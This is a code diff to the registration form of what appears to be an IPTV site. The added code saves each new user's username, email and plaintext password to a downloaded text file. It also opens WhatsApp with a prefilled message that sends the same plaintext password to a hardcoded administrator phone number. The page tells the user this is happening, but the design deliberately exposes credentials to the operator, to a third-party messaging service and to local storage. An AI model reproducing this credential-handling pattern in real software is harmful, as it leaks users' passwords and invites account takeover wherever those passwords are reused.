@@ -794,7 +794,26 @@
             if (isValid) {
                 const userData = { user, email, password };
                 guardarUsuario(userData);
-                successMsg.textContent = '¡Registro exitoso! Ya puedes iniciar sesión, ' + user + '.';
+                
+                // 1. Crear y descargar bloc de notas (.txt)
+                const contenidoTxt = `--- Nuevo Registro IPTV ---\nUsuario: ${user}\nEmail: ${email}\nContraseña: ${password}\n---------------------------`;
+                const blob = new Blob([contenidoTxt], { type: 'text/plain' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `registro_${user}.txt`;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+                
+                // 2. Enviar datos por WhatsApp al administrador
+                const numeroWhatsApp = "56928422082"; // Número de contacto
+                const mensajeWa = `Hola, hay un nuevo registro en la web:%0A*Usuario:* ${user}%0A*Email:* ${email}%0A*Contraseña:* ${password}`;
+                const urlWa = `https://wa.me/${numeroWhatsApp}?text=${mensajeWa}`;
+                window.open(urlWa, '_blank');
+
+                successMsg.textContent = '¡Registro exitoso! Descargando datos y abriendo WhatsApp...';
                 successMsg.style.color = '#00e676';
                 document.getElementById('register-form').reset();
             }
